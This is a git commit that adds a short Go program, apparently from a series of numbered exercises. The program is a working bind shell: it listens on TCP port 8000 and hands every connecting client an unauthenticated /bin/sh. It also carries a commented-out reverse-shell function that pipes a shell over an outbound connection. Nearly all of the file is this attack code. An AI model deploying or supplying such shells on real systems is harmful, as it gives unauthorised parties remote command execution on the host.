f2ebf583dd6cb2514d9bd52e9f58912e23f2ecfc
dreddsa5dies <viktor.vladimirovich.solovev@gmail.com>
2017-07-17 12:28:21 +0300

    shell work

---
+++ 16_shell/shell.go
@@ -0,0 +1,42 @@
+package main
+
+import (
+	"net"
+	"os/exec"
+)
+
+/*
+func reverseShell(network, address, shell string) {
+	c, _ := net.Dial(network, address)
+	cmd := exec.Command(shell)
+	cmd.Stdin = c
+	cmd.Stdout = c
+	cmd.Stderr = c
+	cmd.Run()
+}
+*/
+
+func bindShell(network, address, shell string) {
+	l, _ := net.Listen(network, address)
+	defer l.Close()
+	for {
+		// Wait for a connection.
+		conn, _ := l.Accept()
+		// Handle the connection in a new goroutine.
+		// The loop then returns to accepting, so that
+		// multiple connections may be served concurrently.
+		go func(c net.Conn) {
+			cmd := exec.Command(shell)
+			cmd.Stdin = c
+			cmd.Stdout = c
+			cmd.Stderr = c
+			cmd.Run()
+			defer c.Close()
+		}(conn)
+	}
+}
+
+func main() {
+	//reverseShell("tcp", ":8000", "/bin/sh")
+	bindShell("tcp", ":8000", "/bin/sh")
+}
